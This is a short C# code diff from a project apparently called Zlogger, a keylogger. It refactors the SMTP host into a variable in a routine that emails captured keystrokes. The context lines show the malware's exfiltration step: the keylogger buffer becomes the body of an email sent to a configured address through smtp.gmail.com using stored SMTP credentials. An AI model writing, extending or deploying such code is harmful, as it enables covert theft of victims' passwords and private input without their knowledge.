@@ -55,6 +55,7 @@ namespace Rodjenihm.Zlogger
                 var username = "username"; // username for smtp server
                 var password = "password"; // password for smtp server
                 var emailSendTo = "mail@mail.com"; // Email used to recieve log. It can be the same as emailSender but it doesn't have to be
+                var host = "smtp.gmail.com";
 
                 var mail = new MailMessage
                 {
@@ -64,7 +65,7 @@ namespace Rodjenihm.Zlogger
                 mail.Subject = $"log_{DateTime.Now.ToString("yyyy-MM-dd HH-mm-ss")}.txt"; ;
                 mail.Body = keylogger.Buffer.ToString();
 
-                using (var smtpServer = new SmtpClient("smtp.gmail.com"))
+                using (var smtpServer = new SmtpClient(host))
                 {
                     smtpServer.Port = 587;
                     smtpServer.Credentials = new System.Net.NetworkCredential(username, password);
